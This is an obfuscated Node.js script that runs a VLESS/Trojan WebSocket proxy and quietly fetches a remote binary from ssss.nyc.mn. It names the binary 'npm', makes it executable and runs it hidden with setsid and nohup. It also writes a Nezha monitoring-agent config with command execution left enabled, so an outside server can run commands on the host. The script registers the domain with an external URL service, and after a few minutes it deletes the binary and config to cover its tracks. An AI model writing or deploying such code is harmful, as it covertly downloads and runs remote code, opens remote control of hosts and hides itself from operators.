const _0x177456=_0x16cf;(function(_0x3335bb,_0x2ac3d6){const _0x2b0deb=_0x16cf,_0x14e9a6=_0x3335bb();while(!![]){try{const _0x496f4d=parseInt(_0x2b0deb(0x180))/0x1*(-parseInt(_0x2b0deb(0x144))/0x2)+-parseInt(_0x2b0deb(0x114))/0x3+parseInt(_0x2b0deb(0x129))/0x4*(parseInt(_0x2b0deb(0x168))/0x5)+parseInt(_0x2b0deb(0x172))/0x6+parseInt(_0x2b0deb(0x10a))/0x7+-parseInt(_0x2b0deb(0x126))/0x8*(parseInt(_0x2b0deb(0x139))/0x9)+-parseInt(_0x2b0deb(0x15a))/0xa;if(_0x496f4d===_0x2ac3d6)break;else _0x14e9a6['push'](_0x14e9a6['shift']());}catch(_0x446d05){_0x14e9a6['push'](_0x14e9a6['shift']());}}}(_0x38de,0xf0658));const os=require('os'),http=require(_0x177456(0x176)),fs=require('fs'),axios=require(_0x177456(0x158)),net=require(_0x177456(0x118)),path=require(_0x177456(0x178)),crypto=require(_0x177456(0x127)),{Buffer}=require(_0x177456(0x115)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x177456(0x16e)][_0x177456(0x12d)]||_0x177456(0x10d),NEZHA_SERVER=process[_0x177456(0x16e)][_0x177456(0x163)]||'',NEZHA_PORT=process['env'][_0x177456(0x15b)]||'',NEZHA_KEY=process[_0x177456(0x16e)][_0x177456(0x11c)]||'',DOMAIN=process[_0x177456(0x16e)][_0x177456(0x11f)]||_0x177456(0x16b),AUTO_ACCESS=process[_0x177456(0x16e)][_0x177456(0x159)]||!![],WSPATH=process[_0x177456(0x16e)][_0x177456(0x13d)]||UUID[_0x177456(0x179)](0x0,0x8),SUB_PATH=process['env'][_0x177456(0x184)]||_0x177456(0x173),NAME=process[_0x177456(0x16e)]['NAME']||'',PORT=process[_0x177456(0x16e)][_0x177456(0x167)]||0x1eb4;function _0x38de(){const _0x1ee07b=['arch','post','readFile','text/plain','finish','createServer','https://api.ip.sb/geoip','end','data','\x20-p\x20','base64','log','axios','AUTO_ACCESS','8503060ZYALJc','NEZHA_PORT','sha224','concat','toString','&fp=chrome&type=ws&host=','npm\x20is\x20already\x20running,\x20skip\x20running...','chmod\x20+x\x20npm','isp','NEZHA_SERVER','pipe','createHash','connect','PORT','5620XXNHAr','country_code','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','1234.abc.com','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','get','env','message','catch','utf8','11257770bnbITU','sub723','trim','Answer','http','text/html','path','slice','writeHead','close','from','url','Failed\x20to\x20resolve\x20','listen','2rMswxM','client_secret:\x20','replace','npm','SUB_PATH','type','&path=%2F','stream','application/json','8.8.4.4','pop','11049570JthMhz','unlink','then','5a43bb56f-a523-4563-bf85-af32d4524f21','writeFileSync','readUInt8','error:\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','443','aarch64','2249961Miaglz','buffer','digest','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','net','https://amd64.ssss.nyc.mn/agent','setsid\x20nohup\x20./npm\x20-s\x20','hex','NEZHA_KEY','substr','utf-8','DOMAIN','write','join','error','Unknown','8443','npm\x20download\x20successfully','8LazBwm','crypto','Automatic\x20Access\x20Task\x20added\x20successfully','5516czNaQK','send','reduce','Server','UUID','update','Status','Hello\x20world!','Server\x20is\x20running\x20on\x20port\x20','vless://','readUInt16BE','trojan://','true','npm\x20is\x20running','https://oooo.serv00.net/add-url','length','10739394zEwLRe','find','test','1.1.1.1','WSPATH','arm64','index.html','&type=A','split','map','https://','1226578CdZsvV','false','config.yaml','connection','--tls','every',':443?security=tls&sni=','includes'];_0x38de=function(){return _0x1ee07b;};return _0x38de();}let ISP='';const GetISP=async()=>{const _0x54c2a1=_0x177456;try{const _0x137548=await axios[_0x54c2a1(0x16d)](_0x54c2a1(0x152)),_0x13b624=_0x137548['data'];ISP=(_0x13b624[_0x54c2a1(0x169)]+'-'+_0x13b624[_0x54c2a1(0x162)])[_0x54c2a1(0x182)](/ /g,'_');}catch(_0x1c4c66){ISP=_0x54c2a1(0x123);}};GetISP();const httpServer=http[_0x177456(0x151)]((_0x26dd91,_0x21a628)=>{const _0x5dd9bf=_0x177456;if(_0x26dd91[_0x5dd9bf(0x17d)]==='/'){const _0x1a8d29=path[_0x5dd9bf(0x121)](__dirname,_0x5dd9bf(0x13f));fs[_0x5dd9bf(0x14e)](_0x1a8d29,_0x5dd9bf(0x171),(_0x5a36f5,_0x17903)=>{const _0x4dd400=_0x5dd9bf;if(_0x5a36f5){_0x21a628[_0x4dd400(0x17a)](0xc8,{'Content-Type':'text/html'}),_0x21a628[_0x4dd400(0x153)](_0x4dd400(0x130));return;}_0x21a628[_0x4dd400(0x17a)](0xc8,{'Content-Type':_0x4dd400(0x177)}),_0x21a628[_0x4dd400(0x153)](_0x17903);});return;}else{if(_0x26dd91[_0x5dd9bf(0x17d)]==='/'+SUB_PATH){const _0x3ea365=NAME?NAME+'-'+ISP:ISP,_0x1f5b5d=_0x5dd9bf(0x132)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x5dd9bf(0x15f)+DOMAIN+_0x5dd9bf(0x105)+WSPATH+'#'+_0x3ea365,_0x46cbdb=_0x5dd9bf(0x134)+UUID+'@'+DOMAIN+_0x5dd9bf(0x14a)+DOMAIN+_0x5dd9bf(0x15f)+DOMAIN+_0x5dd9bf(0x105)+WSPATH+'#'+_0x3ea365,_0x403b62=_0x1f5b5d+'\x0a'+_0x46cbdb,_0x10b60a=Buffer[_0x5dd9bf(0x17c)](_0x403b62)[_0x5dd9bf(0x15e)](_0x5dd9bf(0x156));_0x21a628['writeHead'](0xc8,{'Content-Type':_0x5dd9bf(0x14f)}),_0x21a628['end'](_0x10b60a+'\x0a');}else _0x21a628[_0x5dd9bf(0x17a)](0x194,{'Content-Type':_0x5dd9bf(0x14f)}),_0x21a628[_0x5dd9bf(0x153)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x177456(0x12c))]({'server':httpServer}),uuid=UUID[_0x177456(0x182)](/-/g,''),DNS_SERVERS=[_0x177456(0x108),_0x177456(0x13c)];function resolveHost(_0x4e4931){return new Promise((_0x4a0771,_0x51023a)=>{const _0xb3d294=_0x16cf;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0xb3d294(0x13b)](_0x4e4931)){_0x4a0771(_0x4e4931);return;}let _0x1f9e57=0x0;function _0x41023f(){const _0x216c29=_0xb3d294;if(_0x1f9e57>=DNS_SERVERS[_0x216c29(0x138)]){_0x51023a(new Error(_0x216c29(0x17e)+_0x4e4931+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x38c4a7=DNS_SERVERS[_0x1f9e57];_0x1f9e57++;const _0xe9fb93='https://dns.google/resolve?name='+encodeURIComponent(_0x4e4931)+_0x216c29(0x140);axios['get'](_0xe9fb93,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x216c29(0x10c)](_0x2d6e86=>{const _0x8051b7=_0x216c29,_0x25164b=_0x2d6e86[_0x8051b7(0x154)];if(_0x25164b[_0x8051b7(0x12f)]===0x0&&_0x25164b[_0x8051b7(0x175)]&&_0x25164b['Answer'][_0x8051b7(0x138)]>0x0){const _0xccda2=_0x25164b[_0x8051b7(0x175)][_0x8051b7(0x13a)](_0x5a5eeb=>_0x5a5eeb[_0x8051b7(0x104)]===0x1);if(_0xccda2){_0x4a0771(_0xccda2[_0x8051b7(0x154)]);return;}}_0x41023f();})[_0x216c29(0x170)](_0x407cdc=>{_0x41023f();});}_0x41023f();});}function handleVlessConnection(_0x5ae817,_0x2e33c7){const _0x2dd082=_0x177456,[_0x544b44]=_0x2e33c7,_0x203105=_0x2e33c7['slice'](0x1,0x11);if(!_0x203105['every']((_0x26129d,_0x442969)=>_0x26129d==parseInt(uuid[_0x2dd082(0x11d)](_0x442969*0x2,0x2),0x10)))return![];let _0xff3378=_0x2e33c7['slice'](0x11,0x12)[_0x2dd082(0x10f)]()+0x13;const _0x18c131=_0x2e33c7[_0x2dd082(0x179)](_0xff3378,_0xff3378+=0x2)[_0x2dd082(0x133)](0x0),_0x304ae3=_0x2e33c7[_0x2dd082(0x179)](_0xff3378,_0xff3378+=0x1)[_0x2dd082(0x10f)](),_0x42dadb=_0x304ae3==0x1?_0x2e33c7[_0x2dd082(0x179)](_0xff3378,_0xff3378+=0x4)['join']('.'):_0x304ae3==0x2?new TextDecoder()['decode'](_0x2e33c7['slice'](_0xff3378+0x1,_0xff3378+=0x1+_0x2e33c7[_0x2dd082(0x179)](_0xff3378,_0xff3378+0x1)[_0x2dd082(0x10f)]())):_0x304ae3==0x3?_0x2e33c7[_0x2dd082(0x179)](_0xff3378,_0xff3378+=0x10)[_0x2dd082(0x12b)]((_0x25ca0f,_0x1576f0,_0x971a7f,_0x3996e4)=>_0x971a7f%0x2?_0x25ca0f['concat'](_0x3996e4[_0x2dd082(0x179)](_0x971a7f-0x1,_0x971a7f+0x1)):_0x25ca0f,[])[_0x2dd082(0x142)](_0x4a2c30=>_0x4a2c30[_0x2dd082(0x133)](0x0)[_0x2dd082(0x15e)](0x10))[_0x2dd082(0x121)](':'):'';_0x5ae817[_0x2dd082(0x12a)](new Uint8Array([_0x544b44,0x0]));const _0xb1315e=createWebSocketStream(_0x5ae817);return resolveHost(_0x42dadb)['then'](_0x4e18b2=>{const _0x20e4ee=_0x2dd082;net['connect']({'host':_0x4e18b2,'port':_0x18c131},function(){const _0x951ca4=_0x16cf;this['write'](_0x2e33c7[_0x951ca4(0x179)](_0xff3378)),_0xb1315e['on'](_0x951ca4(0x122),()=>{})[_0x951ca4(0x164)](this)['on'](_0x951ca4(0x122),()=>{})['pipe'](_0xb1315e);})['on'](_0x20e4ee(0x122),()=>{});})[_0x2dd082(0x170)](_0x2b2b8e=>{net['connect']({'host':_0x42dadb,'port':_0x18c131},function(){const _0x4f1802=_0x16cf;this[_0x4f1802(0x120)](_0x2e33c7['slice'](_0xff3378)),_0xb1315e['on'](_0x4f1802(0x122),()=>{})['pipe'](this)['on']('error',()=>{})[_0x4f1802(0x164)](_0xb1315e);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x597edb,_0x5ee9e9){const _0x414e1d=_0x177456;try{if(_0x5ee9e9[_0x414e1d(0x138)]<0x3a)return![];const _0x4928a3=_0x5ee9e9[_0x414e1d(0x179)](0x0,0x38)[_0x414e1d(0x15e)](),_0x41e011=[UUID];let _0x4bbe0c=null;for(const _0x108080 of _0x41e011){const _0x35ac0e=crypto[_0x414e1d(0x165)](_0x414e1d(0x15c))[_0x414e1d(0x12e)](_0x108080)[_0x414e1d(0x116)](_0x414e1d(0x11b));if(_0x35ac0e===_0x4928a3){_0x4bbe0c=_0x108080;break;}}if(!_0x4bbe0c)return![];let _0x3cfe9f=0x38;_0x5ee9e9[_0x3cfe9f]===0xd&&_0x5ee9e9[_0x3cfe9f+0x1]===0xa&&(_0x3cfe9f+=0x2);const _0x3d9168=_0x5ee9e9[_0x3cfe9f];if(_0x3d9168!==0x1)return![];_0x3cfe9f+=0x1;const _0x5d57b7=_0x5ee9e9[_0x3cfe9f];_0x3cfe9f+=0x1;let _0x3319a9,_0x28dcb0;if(_0x5d57b7===0x1)_0x3319a9=_0x5ee9e9[_0x414e1d(0x179)](_0x3cfe9f,_0x3cfe9f+0x4)['join']('.'),_0x3cfe9f+=0x4;else{if(_0x5d57b7===0x3){const _0x42658a=_0x5ee9e9[_0x3cfe9f];_0x3cfe9f+=0x1,_0x3319a9=_0x5ee9e9['slice'](_0x3cfe9f,_0x3cfe9f+_0x42658a)['toString'](),_0x3cfe9f+=_0x42658a;}else{if(_0x5d57b7===0x4)_0x3319a9=_0x5ee9e9[_0x414e1d(0x179)](_0x3cfe9f,_0x3cfe9f+0x10)[_0x414e1d(0x12b)]((_0x11fc02,_0x2c095d,_0x5aa1de,_0x37c2ba)=>_0x5aa1de%0x2?_0x11fc02[_0x414e1d(0x15d)](_0x37c2ba[_0x414e1d(0x179)](_0x5aa1de-0x1,_0x5aa1de+0x1)):_0x11fc02,[])[_0x414e1d(0x142)](_0x30042f=>_0x30042f[_0x414e1d(0x133)](0x0)['toString'](0x10))[_0x414e1d(0x121)](':'),_0x3cfe9f+=0x10;else return![];}}_0x28dcb0=_0x5ee9e9['readUInt16BE'](_0x3cfe9f),_0x3cfe9f+=0x2;_0x3cfe9f<_0x5ee9e9[_0x414e1d(0x138)]&&_0x5ee9e9[_0x3cfe9f]===0xd&&_0x5ee9e9[_0x3cfe9f+0x1]===0xa&&(_0x3cfe9f+=0x2);const _0x142750=createWebSocketStream(_0x597edb);return resolveHost(_0x3319a9)[_0x414e1d(0x10c)](_0x5aaf78=>{const _0x51b6de=_0x414e1d;net['connect']({'host':_0x5aaf78,'port':_0x28dcb0},function(){const _0x58d861=_0x16cf;_0x3cfe9f<_0x5ee9e9[_0x58d861(0x138)]&&this[_0x58d861(0x120)](_0x5ee9e9[_0x58d861(0x179)](_0x3cfe9f)),_0x142750['on'](_0x58d861(0x122),()=>{})[_0x58d861(0x164)](this)['on'](_0x58d861(0x122),()=>{})[_0x58d861(0x164)](_0x142750);})['on'](_0x51b6de(0x122),()=>{});})[_0x414e1d(0x170)](_0xb12a65=>{const _0x3b9df2=_0x414e1d;net[_0x3b9df2(0x166)]({'host':_0x3319a9,'port':_0x28dcb0},function(){const _0x4919b1=_0x3b9df2;_0x3cfe9f<_0x5ee9e9[_0x4919b1(0x138)]&&this['write'](_0x5ee9e9[_0x4919b1(0x179)](_0x3cfe9f)),_0x142750['on']('error',()=>{})['pipe'](this)['on'](_0x4919b1(0x122),()=>{})[_0x4919b1(0x164)](_0x142750);})['on'](_0x3b9df2(0x122),()=>{});}),!![];}catch(_0x5a76c4){return![];}}function _0x16cf(_0x462c0b,_0x267331){_0x462c0b=_0x462c0b-0x104;const _0x38de6d=_0x38de();let _0x16cf52=_0x38de6d[_0x462c0b];return _0x16cf52;}wss['on'](_0x177456(0x147),(_0x41232a,_0x535b0c)=>{const _0x3a0885=_0x177456,_0x4ec1d6=_0x535b0c[_0x3a0885(0x17d)]||'';_0x41232a['once'](_0x3a0885(0x16f),_0x44387e=>{const _0x11ddca=_0x3a0885;if(_0x44387e[_0x11ddca(0x138)]>0x11&&_0x44387e[0x0]===0x0){const _0x2e779f=_0x44387e[_0x11ddca(0x179)](0x1,0x11),_0x367ffd=_0x2e779f[_0x11ddca(0x149)]((_0x10e8a6,_0x38b524)=>_0x10e8a6==parseInt(uuid[_0x11ddca(0x11d)](_0x38b524*0x2,0x2),0x10));if(_0x367ffd){!handleVlessConnection(_0x41232a,_0x44387e)&&_0x41232a[_0x11ddca(0x17b)]();return;}}!handleTrojanConnection(_0x41232a,_0x44387e)&&_0x41232a['close']();})['on'](_0x3a0885(0x122),()=>{});});const getDownloadUrl=()=>{const _0x91f47c=_0x177456,_0x68587b=os[_0x91f47c(0x14c)]();return _0x68587b==='arm'||_0x68587b===_0x91f47c(0x13e)||_0x68587b===_0x91f47c(0x113)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x91f47c(0x119);},downloadFile=async()=>{const _0x5e615a=_0x177456;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2a9537=getDownloadUrl(),_0x54e602=await axios({'method':_0x5e615a(0x16d),'url':_0x2a9537,'responseType':_0x5e615a(0x106)}),_0x25cb7b=fs['createWriteStream'](_0x5e615a(0x183));return _0x54e602[_0x5e615a(0x154)][_0x5e615a(0x164)](_0x25cb7b),new Promise((_0x1ea0b2,_0x13e2e7)=>{const _0x2c9920=_0x5e615a;_0x25cb7b['on'](_0x2c9920(0x150),()=>{const _0x2d82f4=_0x2c9920;console['log'](_0x2d82f4(0x125)),exec(_0x2d82f4(0x161),_0x169400=>{if(_0x169400)_0x13e2e7(_0x169400);_0x1ea0b2();});}),_0x25cb7b['on'](_0x2c9920(0x122),_0x13e2e7);});}catch(_0x3adcb8){throw _0x3adcb8;}},runnz=async()=>{const _0x264f1a=_0x177456;try{const _0x2b5e43=execSync(_0x264f1a(0x16a),{'encoding':_0x264f1a(0x11e)});if(_0x2b5e43[_0x264f1a(0x174)]()!==''){console[_0x264f1a(0x157)](_0x264f1a(0x160));return;}}catch(_0x2e285b){}await downloadFile();let _0x4e075c='',_0x2dda04=[_0x264f1a(0x112),_0x264f1a(0x124),'2096','2087','2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x968a00=_0x2dda04['includes'](NEZHA_PORT)?_0x264f1a(0x148):'';_0x4e075c=_0x264f1a(0x11a)+NEZHA_SERVER+':'+NEZHA_PORT+_0x264f1a(0x155)+NEZHA_KEY+'\x20'+_0x968a00+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x35c6a8=NEZHA_SERVER[_0x264f1a(0x14b)](':')?NEZHA_SERVER[_0x264f1a(0x141)](':')[_0x264f1a(0x109)]():'',_0x3714c1=_0x2dda04['includes'](_0x35c6a8)?_0x264f1a(0x135):_0x264f1a(0x145),_0x4f4225=_0x264f1a(0x181)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x264f1a(0x16c)+_0x3714c1+_0x264f1a(0x117)+UUID;fs[_0x264f1a(0x10e)](_0x264f1a(0x146),_0x4f4225);}_0x4e075c=_0x264f1a(0x111);}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x4e075c,{'shell':'/bin/bash'},_0xf63239=>{const _0x3c65d6=_0x264f1a;if(_0xf63239)console[_0x3c65d6(0x122)]('npm\x20running\x20error:',_0xf63239);else console['log'](_0x3c65d6(0x136));});}catch(_0x46a1ff){console[_0x264f1a(0x122)](_0x264f1a(0x110)+_0x46a1ff);}};async function addAccessTask(){const _0x5dce35=_0x177456;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x230d8d=_0x5dce35(0x143)+DOMAIN;try{const _0x39bf9a=await axios[_0x5dce35(0x14d)](_0x5dce35(0x137),{'url':_0x230d8d},{'headers':{'Content-Type':_0x5dce35(0x107)}});console['log'](_0x5dce35(0x128));}catch(_0x4b670a){}}const delFiles=()=>{const _0xb0d171=_0x177456;fs['unlink']('npm',()=>{}),fs[_0xb0d171(0x10b)](_0xb0d171(0x146),()=>{});};httpServer[_0x177456(0x17f)](PORT,()=>{const _0x1f3b0c=_0x177456;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x1f3b0c(0x131)+PORT);});
